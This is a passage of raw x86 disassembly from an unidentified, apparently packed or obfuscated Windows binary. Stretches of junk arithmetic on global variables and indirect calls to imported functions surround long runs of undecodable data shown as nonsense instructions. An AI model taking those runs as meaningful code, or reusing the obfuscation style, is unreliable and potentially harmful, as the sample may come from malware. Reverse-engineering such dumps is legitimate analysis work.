  412e08:	push   DWORD PTR [ebp-0x28]
  412e0b:	call   DWORD PTR ds:0x42e010
  412e11:	mov    edx,DWORD PTR ds:0x428429
  412e17:	xor    DWORD PTR ds:0x428559,edx
  412e1d:	mov    edx,DWORD PTR ds:0x428579
  412e23:	sub    DWORD PTR ds:0x428575,edx
  412e29:	inc    edx
  412e2a:	adc    edx,DWORD PTR ds:0x428575
  412e30:	xor    edx,edx
  412e32:	xor    edx,DWORD PTR ds:0x428471
  412e38:	adc    DWORD PTR ds:0x428569,edx
  412e3e:	mov    edx,DWORD PTR [ebp+0x8]
  412e41:	xor    eax,edi
  412e43:	mov    edi,DWORD PTR [ebp+0xc]
  412e46:	mov    DWORD PTR ds:0x428361,0x757
  412e50:	cmp    eax,edx
  412e52:	mov    DWORD PTR ds:0x428331,0x1fab
  412e5c:	jne    0x412e74
  412e62:	cmp    ecx,edi
  412e64:	mov    DWORD PTR ds:0x428375,0x4385
  412e6e:	je     0x414af6
  412e74:	add    eax,DWORD PTR ds:0x428431
  412e7a:	mov    eax,DWORD PTR [ebp-0x1c]
  412e7d:	neg    DWORD PTR ds:0x428339
  412e83:	mov    ecx,DWORD PTR [ebp-0x1c]
  412e86:	push   0xfffffffe
  412e88:	and    DWORD PTR ds:0x428371,edx
  412e8e:	pop    ebx
  412e8f:	or     DWORD PTR ds:0x42857d,edx
  412e95:	jmp    0x4131ce
  412e9a:	imul   ebx,DWORD PTR [edi+0x1cbccb74],0xf12aa079
  412ea4:	and    BYTE PTR [esi-0x303cf9e4],bl
  412eaa:	mov    WORD PTR [eax-0x42],?
  412ead:	mov    esi,0xbebec4ed
  412eb2:	(bad)  
  412eb4:	into   
  412eb5:	ret    
  412eb6:	sub    ah,bh
  412eb8:	ja     0x412e57
  412eba:	push   es
  412ebb:	nop
  412ebc:	gs mov esi,0xca27d936
  412ec2:	mov    ecx,0x43ed099b
  412ec7:	in     eax,dx
  412ec8:	in     al,dx
  412ec9:	mov    BYTE PTR [ecx-0x72],ah
  412ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ecd:	dec    edi
  412ece:	pop    ebp
  412ecf:	hlt    
  412ed0:	mov    eax,ds:0xfc541dc
  412ed5:	leave  
  412ed6:	and    eax,0x306261f2
  412edb:	push   esi
  412edc:	jl     0x412f2c
  412ede:	pop    esi
  412edf:	mov    ecx,0x371bb088
  412ee4:	mov    ebx,0x8b829c86
  412ee9:	les    ebx,FWORD PTR [edi-0x6b]
  412eec:	mov    esi,0x64d48871
  412ef1:	mov    bl,0x3e
  412ef3:	mov    esi,cs
  412ef5:	cs mov ecx,0xe6fe7812
  412efb:	or     BYTE PTR [edi+ebp*2-0x5bf0ad2c],al
  412f02:	xchg   ecx,eax
  412f03:	add    al,0xe3
  412f05:	and    DWORD PTR [edi-0x36],edi
  412f08:	add    ebp,eax
  412f0a:	hlt    
  412f0b:	test   BYTE PTR [esi+esi*8+0x53b1b51b],cl
  412f12:	and    dh,BYTE PTR [esi]
  412f14:	(bad)  [ebx]
  412f16:	push   edx
  412f17:	jno    0x412f6c
  412f19:	(bad)  
  412f1b:	imul   ebp,eax,0xc97c698c
  412f21:	mov    al,ds:0xd10b661e
  412f26:	(bad)  
  412f28:	dec    esp
  412f29:	jl     0x412ebe
  412f2b:	push   ebx
  412f2c:	sub    DWORD PTR [eax],ecx
  412f2e:	cmp    al,0x66
  412f30:	push   edi
  412f31:	cli    
  412f32:	add    dl,BYTE PTR [ebx]
  412f34:	push   ss
  412f35:	inc    edx
  412f36:	(bad)  
  412f37:	cmp    bh,BYTE PTR [edi]
  412f39:	xchg   edx,eax
  412f3a:	inc    edi
  412f3b:	push   cs
  412f3c:	dec    ebx
  412f3d:	repnz scas eax,DWORD PTR es:[edi]
  412f3f:	dec    edx
  412f40:	mov    ds:0x6ed666bc,al
  412f45:	jmp    0x918afa03
  412f4a:	push   ecx
  412f4b:	mov    WORD PTR [ebx-0x805c6e0],ss
  412f51:	jp     0x412fa6
  412f53:	dec    esi
  412f54:	xchg   edx,eax
  412f55:	xor    esi,ebp
  412f57:	fdivr  QWORD PTR [ecx-0x1660409b]
  412f5e:	fs pop edi
  412f60:	dec    ecx
  412f61:	fmul   QWORD PTR [edx]
  412f63:	dec    ebp
  412f64:	push   0x4b81c77d
  412f69:	cmp    bh,BYTE PTR [eax]
  412f6b:	adc    al,0x5c
  412f6d:	fstp   QWORD PTR [ecx-0xa]
  412f70:	xchg   DWORD PTR [edi-0x2d674e5],edi
  412f76:	jae    0x412fa5
  412f78:	xor    ch,BYTE PTR [esi]
  412f7a:	test   al,0x4d
  412f7c:	(bad)  
  412f7e:	add    ecx,0xb63ea852
  412f84:	call   0x2185d877
  412f89:	xchg   BYTE PTR [ecx*2+0x3dceb8a0],ch
  412f90:	adc    eax,0x7ba9cfdf
  412f95:	shl    DWORD PTR [ebp+ebp*8+0x19],1
  412f99:	add    DWORD PTR [ebp-0x3e],ebx
  412f9c:	(bad)  
  412f9e:	test   al,0xd1
  412fa0:	in     eax,0x2
  412fa2:	cmp    edx,DWORD PTR [ecx+0x1]
  412fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fa6:	push   eax
  412fa7:	aad    0x64
  412fa9:	fwait
  412faa:	out    dx,al
  412fab:	je     0x41301e
  412fad:	neg    DWORD PTR [eax+0x2b73d338]
  412fb3:	loopne 0x412fea
  412fb5:	test   DWORD PTR [ebx-0xbd999c],esp
  412fbb:	dec    esp
  412fbc:	les    edi,FWORD PTR [edi+0x2eab378e]
  412fc2:	loope  0x413011
  412fc4:	jg     0x412fbc
  412fc6:	jno    0x412f85
  412fc8:	retf   
  412fc9:	sbb    al,0xa6
  412fcb:	adc    al,0xf1
  412fcd:	mov    dl,0x17
  412fcf:	shl    BYTE PTR [edx+0x21],1
  412fd2:	fnstcw WORD PTR [edi+0x22]
  412fd5:	sub    al,0xf6
  412fd7:	dec    edi
  412fd8:	mov    eax,ds:0x17eecf9
  412fdd:	shl    DWORD PTR [eax+0x715ac265],0x64
  412fe4:	sbb    edi,DWORD PTR [esi]
  412fe6:	sbb    al,0xe5
  412fe8:	jl     0x413055
  412fea:	mov    ah,0xf7
  412fec:	fldenv [edx-0x6a]
  412fef:	and    ch,BYTE PTR [eax+0x3a46e147]
  412ff5:	adc    edi,0xffffff81
  412ff8:	jmp    0xb88e:0x3ad38992
  412fff:	das    
  413000:	sbb    ebx,esp
  413002:	push   ss
  413003:	pop    edx
  413004:	aam    0x85
  413006:	loope  0x413050
  413008:	leave  
  413009:	inc    edx
  41300a:	div    BYTE PTR [edx+0x66]
  41300d:	lahf   
  41300e:	dec    edi
  41300f:	gs jl  0x413075
  413012:	mov    bl,0xe8
  413014:	ss push 0xbeb78d64
  41301a:	daa    
  41301b:	sbb    eax,DWORD PTR [ebp-0x69857c46]
  413021:	std    
  413022:	jg     0x412faf
  413024:	es pop eax
  413026:	jp     0x413070
  413028:	imul   ebp,DWORD PTR [ebx+ebx*2+0x51b77d93],0xffffff91
  413030:	jg     0x412fcc
  413032:	inc    esi
  413033:	pop    ebx
  413034:	mov    edx,DWORD PTR [edi+0x50]
  413037:	rcr    BYTE PTR [esi],0x3c
  41303a:	jnp    0x413095
  41303c:	stos   DWORD PTR es:[edi],eax
  41303d:	cmp    ah,ch
  41303f:	ds test ch,bh
  413042:	ins    BYTE PTR es:[edi],dx
  413043:	jns    0x413031
  413045:	ret    0xf1e6
  413048:	lods   eax,DWORD PTR ds:[esi]
  413049:	xor    ecx,eax
  41304b:	clc    
  41304c:	fwait
  41304d:	mov    esp,0x4dcdcb70
  413052:	pop    esp
  413053:	xchg   ecx,eax
  413054:	jb     0x413035
  413056:	ja     0x412feb
  413058:	int3   
  413059:	push   edi
  41305a:	dec    DWORD PTR [edx+0x20499bfc]
  413060:	stc    
  413061:	cmp    ecx,DWORD PTR [ebp-0x1564991c]
  413067:	or     ebp,DWORD PTR [eax+0x4dd604ec]
  41306d:	sub    edx,DWORD PTR [ecx]
  41306f:	or     DWORD PTR [esi],0xbdeebab6
  413075:	jecxz  0x4130af
  413077:	js     0x4130ae
  413079:	cmp    bl,0x20
  41307c:	xchg   BYTE PTR [edx-0x4f],dl
  41307f:	mov    ecx,0x7205600f
  413084:	xchg   DWORD PTR [esi],ecx
  413086:	aas    
  413087:	outs   dx,BYTE PTR ds:[esi]
  413088:	cmp    al,0xc1
  41308a:	and    BYTE PTR gs:[eiz*4-0x6c131763],ch
  413092:	sbb    al,0xe0
  413094:	aam    0xb8
  413096:	dec    eax
  413097:	mov    esi,0xdbb04ac9
  41309c:	dec    ebx
  41309d:	inc    ecx
  41309e:	(bad)  
  4130a0:	hlt    
  4130a1:	lods   al,BYTE PTR ds:[esi]
  4130a2:	scas   al,BYTE PTR es:[edi]
  4130a3:	imul   eax,DWORD PTR ds:0x727533d7,0x4c83482f
  4130ad:	sti    
  4130ae:	mov    BYTE PTR [eax-0x18824d87],0x16
  4130b5:	cmc    
  4130b6:	sub    eax,0x47b5ce58
  4130bb:	arpl   sp,dx
  4130bd:	mov    cl,0x9a
  4130bf:	push   0x1b
  4130c1:	aad    0xa7
  4130c3:	add    eax,0x8db1f113
  4130c8:	daa    
  4130c9:	inc    ebp
  4130ca:	aaa    
  4130cb:	popf   
  4130cc:	or     cl,0xdf
  4130cf:	in     al,0x6c
  4130d1:	mov    ds:0xbd804c6d,al
  4130d6:	inc    edi
  4130d7:	mov    bh,0xfb
  4130d9:	mov    BYTE PTR [edx-0x1d1e6c62],ch
  4130df:	nop
  4130e0:	add    eax,0xabd20ddf
  4130e5:	inc    ecx
  4130e6:	nop
  4130e7:	das    
  4130e8:	and    BYTE PTR [eax+eax*2-0x65c7efe0],0x8c
  4130f0:	mov    ebx,0x17b21516
  4130f5:	xor    ch,ah
  4130f7:	js     0x413111
  4130f9:	lea    edx,ds:0x74f2fa24
  4130ff:	pop    esi
  413100:	test   eax,0xe3b75744
  413105:	outs   dx,DWORD PTR ds:[esi]
  413106:	dec    esp
  413107:	lock outs dx,DWORD PTR ds:[esi]
  413109:	ret    0x5c94
  41310c:	jmp    0x413093
  41310e:	add    al,0x2e
  413110:	call   0xfde5:0xe0a4de04
  413117:	mov    DWORD PTR [ebp+0x2c6d07e3],ebp
  41311d:	popf   
  41311e:	cli    
  41311f:	call   0x902c:0x7a62fb68
  413126:	mov    gs,WORD PTR [ecx]
  413128:	xor    edi,DWORD PTR [edi]
  41312a:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41312c:	dec    esp
  41312e:	inc    eax
  41312f:	idiv   BYTE PTR [edi+0x1]
  413132:	push   esp
  413133:	and    eax,0x3fdd43ef
  413138:	lods   eax,DWORD PTR ds:[esi]
  413139:	pop    es
  41313a:	sub    esi,eax
  41313c:	sub    ecx,DWORD PTR [eax-0x32655545]
  413142:	xchg   ebp,eax
  413143:	mov    edx,0x2d408e5c
  413148:	in     al,dx
  413149:	or     eax,0x7863da5a
  41314e:	jl     0x413196
  413150:	ins    DWORD PTR es:[edi],dx
  413151:	out    dx,al
  413152:	add    DWORD PTR [edx],edx
  413154:	js     0x4130ed
  413156:	cli    
  413157:	daa    
  413158:	mov    al,ds:0x192785c1
  41315d:	repnz add dl,BYTE PTR gs:[ebp-0x7ad0fe6c]
  413165:	push   cs
  413166:	jne    0x4131a9
  413168:	arpl   WORD PTR [edx-0x366c8615],si
  41316e:	sub    BYTE PTR [ebp-0x53],dl
  413171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413172:	push   esi
  413173:	out    dx,al
  413174:	outs   dx,BYTE PTR ds:[esi]
  413175:	dec    edi
  413176:	icebp  
  413177:	xor    DWORD PTR [ebx+esi*4],edi
  41317a:	xchg   edx,eax
  41317b:	ins    BYTE PTR es:[edi],dx
  41317c:	out    dx,al
  41317d:	dec    eax
  41317e:	pop    esp
  41317f:	xor    BYTE PTR [esi-0x6e],dl
  413182:	aaa    
  413183:	in     eax,dx
  413184:	hlt    
  413185:	push   ebx
  413186:	xchg   edx,eax
  413187:	fbstp  TBYTE PTR [ebp+ebp*2-0x1d]
  41318b:	pop    ebp
  41318c:	out    dx,al
  41318d:	push   esp
  41318e:	xchg   esi,eax
  41318f:	in     al,dx
  413190:	popf   
  413191:	dec    ecx
  413192:	les    edi,FWORD PTR [eax]
  413194:	mov    edi,0x80e7cf71
  413199:	imul   edx,DWORD PTR [eax],0xffffff90
  41319c:	jmp    0x325f:0x6b276942
  4131a3:	icebp  
  4131a4:	movnti DWORD PTR [ebp-0x257e54db],esi
  4131ab:	cmp    DWORD PTR [eax+0x4cb6ecbe],ecx
  4131b1:	popa   
  4131b2:	repnz jecxz 0x4131a2
  4131b5:	mov    ebp,0xb93fe595
  4131ba:	mov    ds:0x2aa06851,eax
  4131bf:	sti    
  4131c0:	push   ds
  4131c1:	loopne 0x4131b2
  4131c3:	jns    0x413169
  4131c5:	cmp    al,0xbc
  4131c7:	adc    dh,ah
  4131c9:	fist   DWORD PTR [edi+eax*2]
  4131cc:	pop    ds
  4131cd:	push   cs
  4131ce:	xor    ecx,ebx
  4131d0:	xor    edi,edi
  4131d2:	add    edi,DWORD PTR ds:0x428435
  4131d8:	sub    DWORD PTR ds:0x428415,edi
  4131de:	shl    ecx,0x1e
  4131e1:	xor    DWORD PTR ds:0x428365,0x3d84
  4131eb:	mov    edi,0xa5069baf
  4131f0:	xor    eax,edi
  4131f2:	shr    eax,0x2
  4131f5:	jmp    0x41352e
  4131fa:	jmp    0x8a913c60
  4131ff:	mov    eax,0x40087bbc
  413204:	push   0xffffffd1
  413206:	or     DWORD PTR [ebx],esp
  413208:	mov    ds:0xbe7ebc90,al
  41320d:	mov    esi,0xbebec4ed
  413212:	daa    
  413213:	arpl   WORD PTR [edx-0x3e],bx
  413216:	adc    ah,ah
  413218:	fwait
  413219:	dec    eax
  41321a:	sbb    eax,0x8cf9cb30
  41321f:	mov    eax,ds:0x37dfa7eb
  413224:	cmp    ebx,ebx
  413226:	xor    eax,0xa2573516
  41322b:	mov    esp,0x54759f8c
  413230:	imul   ecx,eax,0x5c9a0039
  413236:	sar    BYTE PTR [ecx-0xf8b33e0],cl
  41323c:	pop    esi
  41323d:	fistp  DWORD PTR [eax]
  41323f:	ret    
  413240:	pop    ebx
  413241:	sub    al,0x9a
  413243:	ror    DWORD PTR [edi+0xa],1
  413246:	push   ebp
  413247:	and    BYTE PTR [esi+0x849f7f0],0x7
  41324e:	leave  
  41324f:	int    0x8
  413251:	fdivr  DWORD PTR [esi]
  413253:	cmp    eax,DWORD PTR [ecx-0x5010754d]
  413259:	addr16 in al,dx
  41325b:	outs   dx,DWORD PTR ds:[esi]
  41325c:	aas    
  41325d:	(bad)
  413262:	sbb    ch,BYTE PTR [ebp+0x1a]
  413265:	add    edx,ecx
  413267:	aam    0x0
  413269:	push   0xffffffed
  41326b:	hlt    
  41326c:	dec    esi
  41326d:	sub    BYTE PTR [edi],cl
  41326f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413270:	dec    esp
  413271:	mov    esp,0x2d7ba8c0
  413276:	fsub   DWORD PTR [ebp+0xe2fe21f]
  41327c:	outs   dx,BYTE PTR ds:[esi]
  41327d:	lods   al,BYTE PTR ds:[esi]
  41327e:	xchg   esp,edi
  413280:	out    0xaa,eax
  413282:	popf   
  413283:	jbe    0x4132c1
  413285:	jb     0x413243
  413287:	mov    ebx,0x8a7e2c08
  41328c:	xor    al,0x15
  41328e:	xchg   dl,al
  413290:	cs sub al,0x84
  413293:	cmp    cl,BYTE PTR [eax+0x40]
  413296:	lahf   
  413297:	out    0x78,al
  413299:	call   0x1f0e0eb5
  41329e:	jbe    0x413233
  4132a0:	xchg   esp,eax
  4132a1:	xor    al,BYTE PTR gs:[eax+ebp*2-0xe]
  4132a6:	fistp  DWORD PTR [ebx]
  4132a8:	cli    
  4132a9:	xchg   ecx,eax
  4132aa:	pop    esi
  4132ab:	hlt    
  4132ac:	(bad)  
  4132ad:	fisttp QWORD PTR [ecx-0x7a]
  4132b0:	aam    0x4e
  4132b2:	xor    al,0x76
  4132b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132b5:	pop    ebp
  4132b6:	or     DWORD PTR [edi-0x62],0x81af542f
  4132bd:	and    esi,DWORD PTR [esi-0x33]
  4132c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132c1:	and    BYTE PTR [ebx],bl
  4132c3:	jl     0x413325
  4132c5:	daa    
  4132c6:	cwde   
  4132c7:	xchg   bl,ch
  4132c9:	jo     0x41325e
  4132cb:	shl    DWORD PTR [eax-0x49c3e260],1
  4132d1:	out    dx,eax
  4132d2:	xchg   esp,eax
  4132d3:	mov    eax,0xe6558ae3
  4132d8:	mov    cs,WORD PTR [esi+0x5b]
  4132db:	fwait
  4132dc:	push   ss
  4132dd:	mov    ebp,esp
  4132df:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4132e1:	jmp    0xfa29:0xf6df859e
  4132e8:	mov    ah,0xd9
  4132ea:	pop    ds
  4132eb:	test   DWORD PTR [ebx],ebx
  4132ed:	js     0x41334a
  4132ef:	jle    0x41332e
  4132f1:	ficomp DWORD PTR [ebx]
  4132f3:	cmp    eax,0x870475d7
  4132f8:	lahf   
  4132f9:	sbb    eax,0xf5d3ecb7
  4132fe:	xor    BYTE PTR [ecx+0x35672658],cl
  413304:	ret    0x69ef
  413307:	jle    0x41335a
  413309:	nop
  41330a:	dec    ecx
  41330b:	mov    al,0xfb
  41330d:	shr    BYTE PTR [ebp-0x2b],1
  413310:	jae    0x4132f1
  413312:	jmp    0x6239b7b8
  413317:	xchg   eax,edx
  413319:	fs push eax
  41331b:	not    DWORD PTR ss:[ecx+0x67]
  41331f:	pop    esp
  413320:	out    0x7,eax
  413322:	into   
  413323:	aad    0x34
  413325:	(bad)  
  413326:	fcmovne st,st(0)
  413328:	sbb    BYTE PTR [ecx],0x64
  41332b:	xlat   BYTE PTR ds:[ebx]
  41332c:	test   BYTE PTR [esi-0x237cd2a3],ah
  413332:	mov    cl,0xa1
  413334:	inc    edi
  413335:	(bad)  
  413336:	sub    eax,0xf7e6125a
  41333b:	pop    ebp
  41333c:	cmp    cl,BYTE PTR [eax-0x3]
  41333f:	frstor [eax]
  413341:	jecxz  0x413337
  413343:	je     0x413302
  413345:	imul   edi,DWORD PTR [edi+esi*8-0x5b],0xefdf3fbe
  41334d:	jno    0x41333b
  41334f:	xchg   esp,eax
  413350:	retf   0xa77
  413353:	into   
  413354:	push   esp
  413355:	pop    edi
  413356:	mov    BYTE PTR [esi],dh
  413358:	bound  esi,QWORD PTR [ebp-0x4e]
  41335b:	f2xm1  
  41335d:	test   eax,0x835d8f04
  413362:	and    BYTE PTR [edi],ah
  413364:	jecxz  0x413325
  413366:	in     al,dx
  413367:	mov    cl,0x1f
  413369:	imul   edx,DWORD PTR [esp+eax*2+0x6154550],0x67fcf51e
  413374:	imul   eax,DWORD PTR [ebx+0x5531b627],0x43
  41337b:	cs cdq 
  41337d:	cli    
  41337e:	fistp  WORD PTR [esp+ebp*8+0x19]
  413382:	and    al,0x98
  413384:	adc    DWORD PTR [ebx],esi
  413386:	pop    edx
  413387:	jl     0x413404
  413389:	mov    edi,0xbbd18043
  41338e:	mov    ecx,0xbb28a8d8
  413393:	(bad)  
  413394:	jmp    0xcf5b2653
  413399:	mov    esi,0xd95c8b88
  41339e:	push   es
  41339f:	or     esp,DWORD PTR [eax]
  4133a1:	arpl   WORD PTR ss:[ebp+0x27bc0136],ax
  4133a8:	xor    edx,DWORD PTR [edx-0x6b550a9f]
  4133ae:	mov    ebx,0xf265efca
  4133b3:	outs   dx,DWORD PTR ds:[esi]
  4133b4:	mov    BYTE PTR cs:[ecx],0x1a
  4133b8:	mov    cl,0x89
  4133ba:	shr    BYTE PTR [eax+0x76effe6d],1
  4133c0:	or     DWORD PTR [edi],esi
  4133c2:	pop    ds
  4133c3:	pusha  
  4133c4:	inc    ecx
  4133c5:	ins    DWORD PTR es:[edi],dx
  4133c6:	in     al,dx
  4133c7:	cmp    ebx,DWORD PTR [esi]
  4133c9:	sbb    esi,esi
  4133cb:	cmp    DWORD PTR [ebx-0x5f],edx
  4133ce:	scas   al,BYTE PTR es:[edi]
  4133cf:	pop    esi
  4133d0:	xlat   BYTE PTR ds:[ebx]
  4133d1:	and    ebp,DWORD PTR [ecx]
  4133d3:	loopne 0x413396
  4133d5:	pop    ecx
  4133d6:	xchg   ebx,eax
  4133d7:	test   al,0xef
  4133d9:	pop    ecx
  4133da:	add    ecx,DWORD PTR [ecx+0x9e263db]
  4133e0:	xor    BYTE PTR [ebx-0x1f24c8de],dh
  4133e6:	xchg   edi,eax
  4133e7:	pop    es
  4133e8:	lock stos DWORD PTR es:[edi],eax
  4133ea:	hlt    
  4133eb:	xchg   esp,eax
  4133ec:	ins    BYTE PTR es:[edi],dx
  4133ed:	(bad)  
  4133ee:	int3   
  4133ef:	lahf   
  4133f0:	adc    ecx,DWORD PTR [ebp+0x413784a3]
  4133f6:	repnz jecxz 0x4133d6
  4133f9:	jge    0x413405
  4133fb:	xlat   BYTE PTR ds:[ebx]
  4133fc:	ror    DWORD PTR [ecx],cl
  4133fe:	sbb    esi,eax
  413400:	jg     0x41341c
  413402:	pop    esi
  413403:	or     ebp,eax
  413405:	mov    al,0x80
  413407:	repz mov edx,edi
  41340a:	enter  0x517b,0xb0
  41340e:	daa    
  41340f:	dec    edx
  413410:	aas    
  413411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413412:	jmp    0xb83e:0xee1dadbf
  413419:	scas   al,BYTE PTR es:[edi]
  41341a:	out    0xc4,eax
  41341c:	ret    
  41341d:	std    
  41341e:	retf   
  41341f:	mov    dh,0xfb
  413421:	sti    
  413422:	mov    dl,0xe2
  413424:	dec    ecx
  413425:	xchg   ebx,eax
  413426:	push   0xbf81bb7b
  41342b:	dec    eax
  41342c:	inc    eax
  41342d:	push   es
  41342e:	jne    0x41346f
  413430:	sub    eax,DWORD PTR [ecx]
  413432:	jecxz  0x4133da
  413434:	sbb    BYTE PTR [esi+eax*2],al
  413437:	ds push ds
  413439:	imul   esp,DWORD PTR [esi],0xef015c77
  41343f:	je     0x41340d
  413441:	pop    ebp
  413442:	jmp    0xe5b2339f
  413447:	mov    ah,BYTE PTR ds:0x87b83aa3
  41344d:	mov    ecx,0xad058ed8
  413452:	adc    BYTE PTR [edx+0x7],0xdf
  413456:	cs push ds
  413458:	jnp    0x413415
  41345a:	xor    DWORD PTR [ecx],ebx
  41345c:	ins    DWORD PTR es:[edi],dx
  41345d:	rcl    eax,cl
  41345f:	add    eax,0xd38295c7
  413464:	shr    BYTE PTR [ecx-0x9],1
  413467:	add    BYTE PTR [esi+0x32],0xfd
  41346b:	sar    DWORD PTR [edx+esi*4+0x75c4fe61],0xf6
  413473:	dec    ebx
  413474:	pusha  
  413475:	cmp    BYTE PTR [edi-0x50316770],ah
  41347b:	and    BYTE PTR [edi+eiz*1+0x5173b7da],0xed
  413483:	call   DWORD PTR [ecx+eax*8+0x4d]
  413487:	daa    
  413488:	ret    
  413489:	stos   BYTE PTR es:[edi],al
  41348a:	je     0x41345e
  41348c:	ss mul edi
  41348f:	cmp    BYTE PTR [ebp+edi*4+0x2c],dh
  413493:	lahf   
  413494:	or     ebx,0xfffffffa
  413497:	lock push ss
  413499:	cmp    BYTE PTR [ebp-0x2b],bl
  41349c:	bound  ebp,QWORD PTR [ecx]
  41349e:	jae    0x4134dd
  4134a0:	pushf  
  4134a1:	jmp    0xd122:0x5fa1c9e1
  4134a8:	pop    ecx
  4134a9:	dec    edx
  4134aa:	adc    edx,DWORD PTR [ecx]
  4134ac:	js     0x41343c
  4134ae:	jp     0x4134cb
  4134b0:	and    BYTE PTR ds:0x521b163a,ch
  4134b6:	(bad)  
  4134b7:	mov    bh,0xf1
  4134b9:	cwde   
  4134ba:	and    DWORD PTR [ebp+0x66965d43],edx
  4134c0:	adc    ch,BYTE PTR [esi+0x79]
  4134c3:	(bad)  
  4134c4:	aad    0xc2
  4134c6:	popf   
  4134c7:	mov    dh,BYTE PTR [ebp-0x62d424a3]
  4134cd:	jecxz  0x41349b
  4134cf:	rcr    bh,cl
  4134d1:	xchg   ecx,eax
  4134d2:	sbb    eax,0xfc389b95
  4134d7:	mov    ebp,0x60b26a3a
  4134dc:	jg     0x413461
  4134de:	mov    cl,0x88
  4134e0:	or     dl,cl
  4134e2:	fistp  QWORD PTR [esi-0x365c3ba1]
  4134e8:	xor    eax,0x9cf06826
  4134ed:	clc    
  4134ee:	jae    0x413541
  4134f0:	aam    0x25
  4134f2:	and    eax,DWORD PTR [eax-0x12]
  4134f5:	mov    ss,WORD PTR ds:0xda93c6f5
  4134fb:	lods   eax,DWORD PTR ds:[esi]
  4134fc:	gs addr16 jbe 0x413579
  413500:	pop    es
  413501:	sub    cl,BYTE PTR [esi]
  413503:	mov    esp,0x7b626044
  413508:	gs push edx
  41350a:	mov    edx,0x6563b615
  41350f:	xchg   edx,eax
  413510:	aam    0xb8
  413512:	push   0xffffff8c
  413514:	mov    bl,0x72
  413516:	jge    0x4134ce
  413518:	xchg   edi,eax
  413519:	push   ebx
  41351a:	push   ebp
  41351b:	mov    ebx,DWORD PTR [ebx]
  41351d:	and    DWORD PTR [ecx+0x4fbe9c89],edi
  413523:	inc    eax
  413524:	jmp    0xc880:0x38d5c807
  41352b:	es mov bh,0x4b
  41352e:	or     eax,ecx
  413530:	cmp    DWORD PTR ds:0x428331,0x0
  413537:	mov    DWORD PTR ds:0x428441,0x5b09
  413541:	movzx  ecx,WORD PTR ds:0x428359
  413548:	jmp    0x413626
  41354d:	mov    DWORD PTR ds:0x42836d,0x463b
  413557:	cmp    DWORD PTR ds:0x428331,0x0
  41355e:	ja     0x413594
  413564:	push   0x1092
  413569:	push   0x34c2
  41356e:	push   DWORD PTR [ebp-0x10]
  413571:	push   0x63e1
  413576:	push   0x428295
  41357b:	push   DWORD PTR [ebp-0x24]
  41357e:	call   DWORD PTR ds:0x42e0d8
  413584:	adc    DWORD PTR ds:0x4284f9,0x3ae5
  41358e:	or     ecx,DWORD PTR ds:0x428549
  413594:	mov    ecx,DWORD PTR ds:0x4284d9
  41359a:	xor    DWORD PTR ds:0x428565,ecx
  4135a0:	add    DWORD PTR ds:0x4284c5,0x73c1
  4135aa:	xor    DWORD PTR ds:0x4284d1,0x45f8
  4135b4:	cmp    DWORD PTR ds:0x4284fd,0x0
  4135bb:	mov    ecx,0x9c7
  4135c0:	mov    DWORD PTR ds:0x42834d,0x5708
  4135ca:	mov    DWORD PTR ds:0x4284d1,0x67de
  4135d4:	jmp    0x413626
  4135d9:	mov    ecx,DWORD PTR ds:0x42834d
  4135df:	cmp    DWORD PTR ds:0x4284fd,0x0
  4135e6:	jl     0x413613
  4135ec:	push   DWORD PTR [ebp-0x14]
  4135ef:	push   DWORD PTR [ebp-0x10]
  4135f2:	push   DWORD PTR [ebp-0x28]
  4135f5:	call   DWORD PTR ds:0x42e0dc
  4135fb:	adc    DWORD PTR ds:0x42842d,edx
  413601:	mov    ecx,DWORD PTR ds:0x428341
  413607:	and    DWORD PTR ds:0x42854d,ecx
  41360d:	and    DWORD PTR ds:0x428355,edx
  413613:	mov    ecx,DWORD PTR ds:0x428421
  413619:	xor    ecx,DWORD PTR ds:0x428451
  41361f:	mov    DWORD PTR ds:0x428421,ecx
  413625:	dec    ecx
  413626:	mov    DWORD PTR [ebp-0xc],eax
  413629:	cmp    DWORD PTR ds:0x428449,0x0
  413630:	mov    DWORD PTR ds:0x428425,0x7db5
  41363a:	mov    DWORD PTR ds:0x42845d,edi
  413640:	jmp    0x4136bd
  413645:	mov    ecx,DWORD PTR ds:0x428335
  41364b:	mov    eax,ds:0x42843d
  413650:	cmp    DWORD PTR ds:0x428449,0x0
  413657:	je     0x4136a7
  41365d:	push   DWORD PTR [ebp-0x20]
  413660:	push   DWORD PTR [ebp-0x28]
  413663:	push   DWORD PTR [ebp-0x28]
  413666:	push   DWORD PTR [ebp-0xc]
  413669:	push   DWORD PTR [ebp-0x18]
  41366c:	push   DWORD PTR [ebp-0xc]
  41366f:	push   DWORD PTR [ebp-0x14]
  413672:	push   DWORD PTR [ebp-0x1c]
  413675:	push   DWORD PTR [ebp-0x20]
  413678:	push   DWORD PTR [ebp-0x14]
  41367b:	push   0x6fca
  413680:	push   DWORD PTR [ebp-0x14]
  413683:	push   0x1843
  413688:	call   DWORD PTR ds:0x42e014
  41368e:	movzx  ecx,BYTE PTR ds:0x42842d
  413695:	and    DWORD PTR ds:0x428549,ecx
  41369b:	sbb    ecx,0x7147
  4136a1:	and    DWORD PTR ds:0x4284c5,ebx
  4136a7:	mov    ecx,DWORD PTR ds:0x428475
  4136ad:	add    DWORD PTR ds:0x42841d,ecx
  4136b3:	and    DWORD PTR ds:0x42836d,0x5196
  4136bd:	mov    eax,ds:0x422708
  4136c2:	adc    DWORD PTR ds:0x428425,0x635d
  4136cc:	mov    DWORD PTR [ebp-0xc],eax
  4136cf:	cmp    DWORD PTR ds:0x4284d1,0x0
  4136d6:	mov    DWORD PTR ds:0x428345,0x6dcc
  4136e0:	mov    ecx,DWORD PTR ds:0x428441
  4136e6:	jmp    0x413753
  4136eb:	mov    DWORD PTR ds:0x4284dd,0x2cf
  4136f5:	mov    DWORD PTR ds:0x428581,0x621d
  4136ff:	cmp    DWORD PTR ds:0x4284d1,0x0
  413706:	jbe    0x41373d
  41370c:	push   0x4284d1
  413711:	push   0x428405
  413716:	push   0x2216
  41371b:	call   DWORD PTR ds:0x42e258
  413721:	and    ecx,ecx
